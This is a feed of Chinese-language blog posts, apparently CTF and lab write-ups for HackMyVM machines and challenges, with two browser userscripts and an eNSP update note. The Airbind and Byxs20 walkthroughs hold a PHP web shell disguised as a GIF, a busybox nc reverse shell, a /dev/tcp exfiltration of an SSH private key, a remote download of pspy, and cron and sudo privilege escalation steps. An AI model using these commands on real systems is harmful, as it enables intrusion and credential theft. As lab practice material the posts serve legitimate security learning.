Content-Disposition: form-data; name='logo-url'

----- SNIP -----

5) 您将收到文件已成功上传的响应：

{'status':'Success','message':'Subscription updated successful'}

6) 您的文件将位于：
http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php
```

总结一下就是经典的gif伪装，把下面内容做个`revshell.php.png`传上去，拿burp拦一下删除`.png`后缀就可以了（直接传不一定行，你们可以试试）

```bash
GIF89a;

&lt;?php
system($_GET['cmd']);
?&gt;
```

传上去打开`http://192.168.205.212/images/uploads/logos/`就可以看到了

![image](https://github.com/user-attachments/assets/509e49e8-17f9-46f4-b10e-7cba613d11db)

`http://192.168.205.212/images/uploads/logos/1735465582-1.php?cmd=id`就会发现执行成功，建议传个sh上去拿shell，我试了2个反弹都弹不回来

### 3.**获得稳定 shell**

获得交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

### 4.**提权**

上到去`sudo -l`有惊喜

```bash
www-data@ubuntu:/home$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL

```

执行任意命令

```bash
www-data@ubuntu:/home$ sudo bash -p
root@ubuntu:/home# id
uid=0(root) gid=0(root) groups=0(root)
```

当然当你打开`/root/`目录，你就会看到只有`user.txt`，所以这个应该是一个容器

```bash
root@ubuntu:/home/ubuntu# hostname -I
10.0.3.241 
```

确实是容器，在目录下还看到一个`.ssh`的登录密钥,拿过去我们那测试登录真机

```bash
#容器
root@ubuntu:~/.ssh# cat id_rsa &gt; /dev/tcp/192.168.205.141/7777
#攻击机
nc -lvnp 7777 &gt; id_rsa
```

测试登录ipv4登不上，他把端口关了（可以看最前面的扫描结果），那我们就连接ipv6

```bash
└─$ ping6 -I eth0 ff02::1
ping6: Warning: source address might be selected on device other than: eth0
PING ff02::1 (ff02::1) from :: eth0: 56 data bytes
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=1 ttl=64 time=0.148 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=1 ttl=64 time=0.823 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=2 ttl=64 time=0.055 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=2 ttl=64 time=0.537 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=3 ttl=64 time=0.047 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=3 ttl=64 time=0.493 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=4 ttl=64 time=0.038 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=4 ttl=64 time=0.350 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=5 ttl=64 time=0.041 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=5 ttl=64 time=0.349 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=6 ttl=64 time=0.035 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=6 ttl=64 time=0.332 ms
^C
--- ff02::1 ping statistics ---
6 packets transmitted, 6 received, +6 duplicates, 0% packet loss, time 5116ms
rtt min/avg/max/mdev = 0.035/0.270/0.823/0.244 ms
                                                                                  
```

发广播看看谁在线，然后一个个试就好了（桥接真实网卡别这么连，建议把桥接换成NAT模式再尝试）

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh -i id_rsa root@fe80::a00:27ff:fead:e1d7%eth0
Linux airbind 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@airbind:~# id
uid=0(root) gid=0(root) groupes=0(root)
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_airbind.html</guid><pubDate>Fri, 27 Jun 2025 09:32:26 +0000</pubDate></item><item><title>HackMyVM 油猴辅助脚本</title><link>https://7r1UMPHK.github.io/post/HackMyVM%20-you-hou-fu-zhu-jiao-ben.html</link><description>## 1. 起因 🤔

最近逛我博客的新朋友好像多了起来，不少人被安利去玩 **HackMyVM** 了。不过，刚上手可能会遇到些小麻烦。

比如我自己玩的时候，就经常因为发呆太久（或者查资料时间长了点）导致会话超时，每次都得重新登录，**挺烦人的**。还有，打 Challenge 的时候，每次提交完 Flag 都得**手动去改 URL 跳到下一个**，点几下也是有点小不爽。

为了解决这两个痛点，我利用 AI 捣鼓了一个油猴脚本，也复制给大家 Todd 大佬的一个脚本，希望能让大家的 HackMyVM 体验**更舒服一点**。👍

---

## 2. 脚本一：保持在线不掉线⏳

### 2.1. 它能干啥？

这个脚本主要就是为了防止你因为长时间没在 HackMyVM 页面上操作而被强制踢下线。它会**悄悄地在后台帮你自动刷新页面**，这样你就可以安心地查资料、写笔记或者暂时离开一下，不用担心回来又要重新登录了。

### 2.2. 它是怎么工作的？

```javascript
// ==UserScript==
// @name         保持hackmyvm的登录状态
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  定时刷新页面，保持登录状态，目前 5 分钟
// @require
// @author       Todd
// @match        https://hackmyvm.eu/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';
  // 设置一个定时器，每隔 5 分钟（300,000 毫秒）就让它干点事
  setInterval(() =&gt; {
    // 干的事就是：刷新一下当前页面
    location.reload();
  }, 1000 * 60 * 5); // 1秒 * 60 * 5 = 5分钟
})();
```

*   `@match https://hackmyvm.eu/*`: 这行是告诉油猴（Tampermonkey），这个脚本只在 HackMyVM 网站 (`https://hackmyvm.eu/`) 下的所有页面生效。
*   `setInterval(() =&gt; location.reload(), 1000 * 60 * 5);`: 这是脚本的核心。`setInterval` 会让浏览器**每隔 5 分钟**就执行一次 `location.reload()` 这个命令，也就是刷新当前页面，模拟你还在活跃状态，从而保持登录。

### 2.3. 谁写的？

这个脚本是 **Todd** 大佬写的。膜拜大佬！orz

&gt; **P.S.** 如果想去 Todd 大佬的博客看看，可以点击[**这里**](https://blog.findtodd.com/)，或者去我的友链页面也能找到跳转链接。

### 2.4. 什么情况下用比较好？

**强烈推荐**给需要在 HackMyVM 上查资料、写 Writeup，或者只是挂着页面思考解题思路的朋友们。有了它，麻麻再也不用担心，我动不动就得重新登录了，就算你暂时离开电脑一会儿，也能帮你保住登录状态。

---

## 3. 脚本二：挑战关卡快速跳转🚀

### 3.1. 它能干啥？

打 Challenge 时是不是觉得每次输完 Flag 都要手动改 URL 去下一个有点烦？这个脚本就是来解决这个问题的！

它给 HackMyVM 的挑战页面 (`challenge.php`) 加了个快捷操作：你可以直接 **按鼠标侧键**（通常是“前进”那个按钮，一般是 `Button 4`）或者**键盘的右箭头 `→`**，脚本就会自动帮你跳转到下一个 Challenge 页面，**省事多了**！

### 3.2. 它是怎么工作的？

```javascript
// ==UserScript==
// @name         HackMyVM挑战页面快速导航
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  使用鼠标侧上键或右箭头快速导航到下一个挑战页面
// @author       AI &amp; YourName (Modify)
// @match        https://hackmyvm.eu/challenges/challenge.php?c=*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // 封装一个跳转到下一关的动作
    function navigateToNextChallenge() {
        const currentUrl = window.location.href; // 获取当前页面的网址
        // 用正则表达式抓取网址里 c= 后面的数字 (挑战编号)
        const challengeMatch = currentUrl.match(/c=(\d+)/);

        if (challengeMatch &amp;&amp; challengeMatch[1]) { // 确保抓到了编号
            // 把抓到的编号字符串转成数字
            const currentChallenge = parseInt(challengeMatch[1], 10);
            // 计算下一个挑战的编号
            const nextChallenge = currentChallenge + 1;
            // HackMyVM 的编号通常是三位数 (如 001, 019)，所以格式化一下，不够三位前面补 0
            const formattedNextChallenge = String(nextChallenge).padStart(3, '0');
            // 把当前网址里的 'c=旧编号' 替换成 'c=新编号'，得到新网址
            const newUrl = currentUrl.replace(/c=\d+/, 'c=' + formattedNextChallenge);
            // 跳转到新网址
            window.location.href = newUrl;
        }
    }

    // 监听鼠标按键抬起事件
    document.addEventListener('mouseup', function(event) {
        // 检查是不是鼠标侧键（前进键，按钮编号通常是 4）
        if (event.button === 4) { // button 4 通常是侧前键
            navigateToNextChallenge(); // 是的话，就执行跳转
        }
    });

    // 监听键盘按键按下事件
    document.addEventListener('keydown', function(event) {
        // 检查是不是按了右箭头键
        if (event.key === 'ArrowRight') {
            navigateToNextChallenge(); // 是的话，也执行跳转
        }
    });

})();
```

*   `@match https://hackmyvm.eu/challenges/challenge.php?c=*`: 这个脚本专门针对**挑战页面**，所以只在网址匹配这个模式 (`challenge.php` 后面跟着 `?c=`) 的时候运行。
*   `navigateToNextChallenge()`: 这是核心的跳转逻辑函数。它会：
    1.  拿到你当前所在挑战页面的 URL。
    2.  用**正则表达式**从 URL 里把挑战编号（比如 `c=005` 里的 `005`）抠出来。
    3.  把编号加 1，得到下一个挑战的编号。
    4.  **特别处理**：因为 HackMyVM 的编号喜欢用**三位数**（像 `001`, `020` 这种），所以脚本会把新的编号也**格式化成三位数**（比如 `6` 会变成 `006`），不足三位前面补 `0`。
    5.  最后，生成一个新的 URL（把旧编号替换成新编号），然后让浏览器跳转过去。
*   `addEventListener('mouseup', ...)`: 这部分是**监听鼠标按键抬起**的动作。如果松开的是鼠标侧前键（`event.button === 4`），就调用上面的跳转函数。
*   `addEventListener('keydown', ...)`: 这部分是**监听键盘按键按下**的动作。如果按的是右箭头（`event.key === 'ArrowRight'`），也调用跳转函数。

### 3.3. 谁写的？

这个脚本主要是 **AI** 编写的。（我就起到了一个 `Ctrl+C` / `Ctrl+V` 😉）。

### 3.4. 什么情况下用比较好？

如果你喜欢**按顺序刷 HackMyVM 的 Challenge**，这个脚本绝对是提升效率的神器！它能帮你省下不少点击和修改 URL 的时间，让刷题过程**更流畅**、**体验更好**。
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/HackMyVM%20-you-hou-fu-zhu-jiao-ben.html</guid><pubDate>Fri, 27 Jun 2025 09:32:23 +0000</pubDate></item><item><title>eNSP 在 Windows 11 24H2 上的兼容性问题已通过 KB5053656 更新解决</title><link>https://7r1UMPHK.github.io/post/eNSP%20-zai-%20Windows%2011%2024H2%20-shang-de-jian-rong-xing-wen-ti-yi-tong-guo-%20KB5053656%20-geng-xin-jie-jue.html</link><description>## 问题背景

许多用户在将 Windows 11 操作系统升级到 **Version 24H2** 后，遇到了华为网络模拟平台 eNSP 无法正常工作的问题。具体表现通常为启动 AR 路由器等设备时失败，并可能伴随 **错误代码 40 (Error Code 40)** 的提示。这给依赖 eNSP 进行学习和实验的用户带来了不便。

## 解决方案：官方补丁 KB5053656

好消息是，微软官方已经意识到了这个问题，并发布了相应的修复补丁。根据最新信息（更新于 20250408 左右），Windows 更新 **KB5053656** 已经解决了 eNSP 在 Windows 11 24H2 上的兼容性问题。

此更新包含了多项新功能、功能优化和问题修复，其中就包括了对导致 eNSP 异常的底层问题的修正。该补丁适用于 **Windows 11 家庭版、专业版和专业工作站版**。

## 如何获取并安装修复补丁

请按照以下步骤操作，以确保您的系统安装了必要的更新：

1.  **打开 Windows 更新：**
    *   点击 “开始” 菜单，选择 “设置”。
    *   在 “设置” 窗口中，导航至 “Windows 更新”。

2.  **检查并获取更新：**
    *   点击 **“检查更新”** 或 **“获取更新”** 按钮。
    *   系统将开始查找可用的更新。如果您已经升级到 Win11 24H2，可能会看到多个待安装的更新。
    *   请重点关注并确保安装名为 **“2025-适用于 Windows 11 Version 24H2 的 03 累积更新，适合基于 x64 的系统 (KB5053656)”** 的补丁。
    *   *注意：更新名称中的 '2025-...' 可能与发布时间相关，关键是识别 **KB5053656** 这个编号。*

3.  **安装并重启：**
    *   让 Windows 下载并安装所有选定的更新，包括 KB5053656。
    *   安装完成后，根据系统提示 **重启您的计算机** 以使更新生效。

## 验证修复结果

成功安装 KB5053656 更新并重启计算机后：

1.  启动 eNSP 应用程序。
2.  尝试新建一个拓扑，并添加一个 AR 路由器或其他之前无法启动的设备。
3.  启动该设备。
4.  如果设备能够成功启动并进入命令行界面，则表示问题已解决。

## 安装更新后仍遇错误代码 40？

如果在安装了 KB5053656 补丁之后，启动 AR 设备时 **仍然** 遇到错误代码 40，那么这很可能不再是由于 Windows 11 24H2 的兼容性问题引起的。此时，您应该按照 **解决 eNSP 错误代码 40 的常规方法** 进行排查，常见原因和解决方法包括：

*   检查 VirtualBox 的版本是否与 eNSP 兼容。
*   确保 VirtualBox 的网络适配器设置正确。
*   检查 Windows 防火墙或第三方安全软件是否阻止了 eNSP 或 VirtualBox 的通信。
*   尝试重新注册 AR 设备。
*   以管理员权限运行 eNSP。

## 结论

Windows 11 Version 24H2 与 eNSP 的兼容性问题现已通过微软官方发布的 **KB5053656** 更新得到**完全解决**。遇到此问题的用户应尽快通过 Windows Update 安装此补丁，以恢复 eNSP 的正常使用。如果安装补丁后仍有问题，请转向排查 eNSP 本身或其依赖环境（如 VirtualBox）的常见配置问题。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/eNSP%20-zai-%20Windows%2011%2024H2%20-shang-de-jian-rong-xing-wen-ti-yi-tong-guo-%20KB5053656%20-geng-xin-jie-jue.html</guid><pubDate>Fri, 27 Jun 2025 09:32:21 +0000</pubDate></item><item><title>Byxs20靶机渗透测试报告 (Write-Up)</title><link>https://7r1UMPHK.github.io/post/Byxs20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-Up%29.html</link><description>*   **靶机名称:** Byxs20 (内部测试 - 可能发布于 HackMyVm)
*   **难度:** 简单 (Easy)
*   **目标:** 获取 user.txt 和 root.txt 文件中的 flag。
*   **关键点:** Web 命令注入、Cron 任务利用、Sudo 提权

---

## 1. 信息收集 (Enumeration)

初始阶段的目标是尽可能多地了解目标系统。

* **网络发现 (arp-scan):**
  使用 `arp-scan` 扫描本地网络，发现目标靶机的 IP 地址。

  ```bash
  sudo arp-scan -l
  ```

  锁定目标 IP 为 `192.168.205.194`。

* **端口扫描 (nmap):**
  对目标 IP 进行全端口 TCP 扫描，识别开放的服务。

  ```bash
  nmap -p- 192.168.205.194
  ```

  发现开放了两个关键端口：

  *   `22/tcp`: SSH 服务
  *   `80/tcp`: HTTP 服务 (Web 服务器)

* **Web 内容发现 (gobuster):**
  针对 80 端口的 Web 服务进行目录和文件枚举。

  ```bash
  gobuster dir -u http://192.168.205.194 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,md,html,zip,bak
  ```

  发现以下值得关注的路径和文件：

  *   `/index.html`: 网站首页。
  *   `/templates/`: 存在目录列表，包含 `about.html`, `contact.html`, `home.html` 等模板文件。
  *   `/template.php`: 一个 PHP 脚本，似乎用于加载模板。
  *   `/conf/`: 同样存在目录列表，可能存放配置文件。
  *   `/ping.php`: 另一个 PHP 脚本，名字暗示其功能与网络 ping 相关。

## 2. 获取初步立足点 (www-data 权限)

* **分析 Web 功能:**

  *   尝试访问 `/template.php`，发现可以通过 `?page=` 参数加载 `/templates/` 目录下的文件（如 `?page=about` 会包含 `about.php`）。这暗示存在 LFI (本地文件包含) 漏洞。
  *   进一步测试 LFI，尝试读取 `/etc/passwd` (`?page=../../../../etc/passwd`) 失败。错误信息显示脚本在路径末尾强制添加了 `.php` 后缀。
  *   **重要发现:** 尝试包含脚本自身 (`?page=../template`) 也失败了，并返回 `No such file or directory`。这强烈暗示 PHP 配置了 `open_basedir`，限制了文件包含的范围，使得这个 LFI 漏洞难以直接利用来读取敏感文件。

* **探索 `ping.php`:**

  *   直接访问 `ping.php` 返回 'Invalid IP!'。
  *   使用 `ip` 参数 (`ping.php?ip=127.0.0.1`) 可以成功执行 ping 命令。

* **发现隐藏参数 (wfuzz):**
  使用 `wfuzz` 对 `ping.php` 进行参数 Fuzzing，寻找除 `ip` 之外的其他参数。

  ```bash
  wfuzz -u 'http://192.168.205.194/ping.php?FUZZ=127.0.0.1' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 2
  ```

  发现了一个名为 `debug` 的参数。

* **命令注入 (Command Injection):**
  **核心发现：** 单独使用 `ip` 参数只能执行 ping，单独使用 `debug` 参数（如果有效）也无法直接 RCE。**必须将 `ip` 和 `debug` 参数结合起来**，才能触发命令注入漏洞。
  测试命令注入：使用 `%0A` (URL 编码的换行符) 在 `ip` 参数中附加 `id` 命令，并同时加上 `debug=1` 参数。

  ```bash
  curl 'http://192.168.205.194/ping.php?ip=127.0.0.1%0Aid&amp;debug=1'
  ```

  返回的输出包含了 `[*] Debug Mode Activated`、`[+] Raw Command: ping -c 3 127.0.0.1\nid` 以及 `id` 命令的执行结果 (`uid=33(www-data)...`)，确认了命令注入！

* **获取反弹 Shell (Reverse Shell):**
  利用这个命令注入点获取反向 Shell。

  1. 在攻击机上设置 Netcat 监听：

     ```bash
     nc -lvnp 8888
     ```

  2. 构造并发送反弹 Shell 的 payload。使用 `busybox nc` 提高兼容性，并对 payload 进行 URL 编码。

     ```bash
     # Payload: busybox nc [你的攻击机IP] 8888 -e /bin/bash
     # URL 编码后: busybox%20nc%20[你的攻击机IP]%208888%20-e%20%2Fbin%2Fbash
     curl 'http://192.168.205.194/ping.php?ip=127.0.0.1%0Abusybox%20nc%20[你的攻击机IP]%208888%20-e%20%2Fbin%2Fbash&amp;debug=1'
     ```

     将 `[你的攻击机IP]` 替换为你的 IP。执行后，`nc` 监听端应收到连接。

* **升级 Shell:**
  为了更好的交互体验，将获取到的基础 Shell 升级为标准的 TTY。

  ```bash
  # 在反弹 Shell 中
  script /dev/null -c bash
  # 按 Ctrl+Z
  # 在攻击机终端
  stty raw -echo; fg
  # 按两次 Enter
  # 回到反弹 Shell
  reset xterm
  export TERM=xterm
  export SHELL=/bin/bash
  stty rows 40 columns 178 # 根据实际终端调整
  ```

  现在你拥有了一个稳定的 `www-data` 权限 Shell。

## 3. 权限提升 (Privilege Escalation)

* **进程监控与 Cron 任务发现 (pspy):**
  上传并运行 `pspy64` 工具来监控系统进程，寻找提权机会。

  1. 在攻击机上开启 HTTP 服务以提供 `pspy64`。

  2. 在目标机 `/tmp` 目录下下载并运行 `pspy64`。

     ```bash
     # 在目标机 www-data Shell 中
     cd /tmp
     busybox wget http://[你的攻击机IP]/pspy64
     chmod +x pspy64
     ./pspy64
     ```

     `pspy64` 的输出揭示了一个以 root 权限 (`UID=0`) 定期执行的 Cron 任务：

  ```
  2025/04/20 09:42:01 CMD: UID=0 PID=658 | /bin/sh -c cp /var/www/html/conf/apache2.conf.bak /etc/apache2/apache2.conf
  ```

  这个任务每分钟会将 `/var/www/html/conf/apache2.conf.bak` 覆盖到 `/etc/apache2/apache2.conf`。由于 `www-data` 用户通常对 `/var/www/html/conf` 目录有写权限，这成为了提权的关键。

* **提权方法 1: Cron + 符号链接任意文件读取**
  利用 Cron 任务覆盖文件的行为，通过创建符号链接来读取任意文件。

  1. **读取 user flag:** 将 `apache2.conf.bak` 链接到 `user.txt`。

     ```bash
     cd /var/www/html/conf
     ln -sf /home/welcome/user.txt apache2.conf.bak
     ```

  2. 等待 Cron 任务执行（最多 1 分钟）。

  3. 读取被覆盖后的 Apache 配置文件，即得到 `user.txt` 的内容。

     ```bash
     cat /etc/apache2/apache2.conf
     # -&gt; flag{user-05659dca555d4ddbc396b319645f3d2a}
     ```

  4. **读取 root flag:** 删除旧链接，创建新链接指向 `root.txt`。

     ```bash
     rm apache2.conf.bak
     touch apache2.conf.bak
     ln -sf /root/root.txt apache2.conf.bak
     ```

  5. 再次等待 Cron 任务执行。

  6. 读取 Apache 配置文件得到 `root.txt` 的内容。

     ```bash
     cat /etc/apache2/apache2.conf
     # -&gt; flag{root-f9ef88715e3bbec612f9f88d64ae3a99}
     ```

* **提权方法 2: Cron 修改配置 + 用户切换 + Sudo 提权**
  这是一个更曲折但同样有效的方法。

  1. **修改 Apache 配置:** 利用 Cron 任务，修改 Apache 的运行用户为 `welcome`。

     ```bash
     cd /var/www/html/conf
     nano apache2.conf.bak
     User welcome
     Group welcome
     ```

  2. 等待 Cron 执行，并让 Apache 服务以新用户身份运行（可以直接`sudo /usr/sbin/reboot`）。

  3. **获取 `welcome` Shell:** 再次使用之前的命令注入获取反弹 Shell。连接后确认用户身份。

     ```bash
     # ... 获取反弹 Shell ...
     id
     # 应显示 uid=1000(welcome) ...
     ```

  4. **检查 Sudo 权限:** 作为 `welcome` 用户，查看其 `sudo` 权限。

     ```bash
     sudo -l
     ```

     发现 `welcome` 可以无密码执行 `/home/welcome/test/test`。

  5. **利用 Sudo 规则:** 由于 `welcome` 可以控制 `test/test` 脚本的内容，可以构造恶意脚本。

  6. 创建脚本，赋予 `/bin/bash` SUID 权限。

     ```bash
     mv /home/welcome/test /home/welcome/test1
     mkdir /home/welcome/test
     echo '#!/bin/bash' &gt; /home/welcome/test/test
     echo 'chmod u+s /bin/bash' &gt;&gt; /home/welcome/test/test
     chmod +x /home/welcome/test/test
     ```

  7. 通过 `sudo` 执行该脚本。

     ```bash
     sudo /home/welcome/test/test
     ```

  8. **获取 Root:** 执行带有 SUID 权限的 `bash`。

     ```bash
     bash -p
     id
     # 应显示 euid=0(root)
     ```

     成功获取 root 权限。

## 4. 获取 Flag

*   **User Flag:** `flag{user-05659dca555d4ddbc396b319645f3d2a}` (位于 `/home/welcome/user.txt`)
*   **Root Flag:** `flag{root-f9ef88715e3bbec612f9f88d64ae3a99}` (位于 `/root/root.txt`)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Byxs20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-Up%29.html</guid><pubDate>Fri, 27 Jun 2025 09:32:18 +0000</pubDate></item><item><title>Challenge 012</title><link>https://7r1UMPHK.github.io/post/Challenge%20012.html</link><description># Challenge 012

# Challenge 012

**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=012

![挑战图片](https://7r1umphk.github.io/image/20250518110545680.webp)

## 1. 初步分析

下载文件

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 012.zip 012.mp3 
-rwxr-xr-x 1 kali kali 17286 Mar  6  2022 012.mp3
-rwxr-xr-x 1 kali kali 16978 May 17 23:06 012.zip
```
首先尝试直接解压 `012.zip` 文件，解压出`012.mp3`
### 2 音频内容分析

通过播放 `012.mp3` 文件并仔细听取其内容。音频中说出的英文短语是：

'I love languages'

## 4. Flag

最终的 Flag 是：

```
HMV{Ilovelanguages}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20012.html</guid><pubDate>Fri, 27 Jun 2025 09:32:15 +0000</pubDate></item><item><title>Challenge 010</title><link>https://7r1UMPHK.github.io/post/Challenge%20010.html</link><description># 1. 初步分析

**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=010

![挑战图片](https://7r1umphk.github.io/image/20250518105910057.webp)

## 1. 初步分析

挑战页面直接显示了一串看起来经过编码的字符串：

```
853-3GB.eOG[ko/A7oS$FF=
```

这串字符包含了大小写字母、数字以及一些特殊符号 (`-`, `.`, `[`, `]`, `/`, `$`, `=`)。这种字符集通常暗示了某种 Base 编码，特别是字符种类比 Base64 更广，因此可以初步怀疑是 Base85 或其变种。

## 2. 解码过程

为了解开这个字符串，我们需要识别其编码方式并使用相应的工具进行解码。

### 2.1 编码分析与工具选择

观察字符串 `853-3GB.eOG[ko/A7oS$FF=` 的特征：
*   包含数字 (0-9)
*   包含大写字母 (A-Z)
*   包含小写字母 (a-z)
*   包含特殊符号 (`-`, `.`, `[`, `]`, `/`, `$`, `=`)

这种广泛的字符集，尤其是特殊符号的出现，强烈指向了 Base85 (也称为 Ascii85) 编码。

CyberChef 是一个非常强大的在线编解码工具，支持多种编码格式，非常适合用于尝试解码此类字符串。

### 2.2 使用 CyberChef 进行解码

我们将字符串粘贴到 CyberChef 中，并应用 'From Base85' 操作。

1.  打开 CyberChef。
2.  将输入字符串 `853-3GB.eOG[ko/A7oS$FF=` 粘贴到 'Input' 框中。
3.  在 'Operations' 列表中搜索 'From Base85' 并将其拖拽到 'Recipe' 区域。

CyberChef 的操作界面和结果如下：

![CyberChef 解码 Base85](https://7r1umphk.github.io/image/20250518105917695.webp)

解码后的输出即为 Flag。

## 3. Flag

从 CyberChef 的解码结果中，我们获得了最终的 Flag：

```
HMV{wrtzxcvfdghyt}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20010.html</guid><pubDate>Fri, 27 Jun 2025 09:32:13 +0000</pubDate></item><item><title>Challenge 008</title><link>https://7r1UMPHK.github.io/post/Challenge%20008.html</link><description># Challenge 008

# Challenge 008

**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=008

![挑战图片](https://7r1umphk.github.io/image/20250518104404775.webp)

## 1. 初步分析

挑战提供了一个可下载文件：`008.zip`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 008.zip      
-rwxr-xr-x 1 kali kali 178 May 17 22:44 008.zip
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 008.zip     
Archive:  008.zip
   skipping: flag.txt                need PK compat. v5.1 (can do v4.6)
```
文件是一个很小的 zip 压缩包（178 字节）。并且它受密码保护，内部包含一个 flag 文件。

## 2. 密码破解

为了破解 zip 文件的密码，我们可以使用 `zip2john` 提取哈希值，然后使用 `john`进行破解。

### 2.1 提取哈希

首先，使用 `zip2john` 将 `008.zip` 文件的哈希值提取并保存到 `hash` 文件中：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ zip2john 008.zip &gt; hash
```

查看 `hash` 文件的内容：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat hash 
008.zip/flag.txt:$zip2$*0*3*0*751e06905814ebe63a63c72e8755d887*d807*e*25e3c7613e997071cd21a2163883*ba4cf18e59493b2515da*$/zip2$:flag.txt:008.zip:008.zip
```
这串字符就是 `john` 可以识别的哈希格式。

### 2.2 使用 John the Ripper 破解哈希

接下来，使用 `john` 和一个常见的密码字典（例如 `rockyou.txt`）来破解这个哈希值：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
Cost 1 (HMAC size) is 14 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
survivor         (008.zip/flag.txt)     
1g 0:00:00:00 DONE (2025-05-17 22:46) 6.666g/s 218453p/s 218453c/s 218453C/s 123456..eatme1
Use the '--show' option to display all of the cracked passwords reliably
Session completed.
```
从输出中可以看到，破解得到的密码是 `survivor`。

## 3. 解压文件并获取 Flag

得到密码后，我们尝试解压 `008.zip` 文件。

标准的 `unzip` 命令可能会因为 PKWARE 版本兼容性问题而失败：
```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 008.zip     
Archive:  008.zip
   skipping: flag.txt                need PK compat. v5.1 (can do v4.6)
```
提示 `need PK compat. v5.1 (can do v4.6)`，表明当前的 `unzip` 工具版本可能不完全支持该 zip 文件的加密特性。

我们可以改用 `7z` (7-Zip) 命令进行解压，它通常具有更好的兼容性：
```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ 7z x 008.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 178 bytes (1 KiB)

Extracting archive: 008.zip
--
Path = 008.zip
Type = zip
Physical Size = 178

Enter password (will not be echoed):
```
此时，输入之前破解得到的密码 `survivor`：
```bash
Enter password (will not be echoed):survivor  # 此处输入密码，终端不回显
Everything is Ok

Size:       14
Compressed: 178
```
解压成功后，会在当前目录下生成 `flag.txt` 文件。查看其内容：
```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat flag.txt 
HMV{cromiphi}
```

## 4. Flag

最终的 Flag 是：
```
HMV{cromiphi}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20008.html</guid><pubDate>Fri, 27 Jun 2025 09:32:09 +0000</pubDate></item><item><title>Challenge 023</title><link>https://7r1UMPHK.github.io/post/Challenge%20023.html</link><description>![image-20250612190323903](https://7r1umphk.github.io/image/202506121903204.webp)

```
022E296D100B1622455D0A16031B130C11
```

cisco type 7

https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html

![image-20250612190738406](https://7r1umphk.github.io/image/202506121907603.webp)

```
HMV{myciscoflag}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20023.html</guid><pubDate>Fri, 27 Jun 2025 09:32:07 +0000</pubDate></item><item><title>Challenge 022</title><link>https://7r1UMPHK.github.io/post/Challenge%20022.html</link><description>![image-20250612185701829](https://7r1umphk.github.io/image/202506121857127.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 022.zip 
-rwxr-xr-x 1 kali kali 197976 Jun 12 06:57 022.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 022.zip 
Archive:  022.zip
 extracting: 022.png                 
                    
```

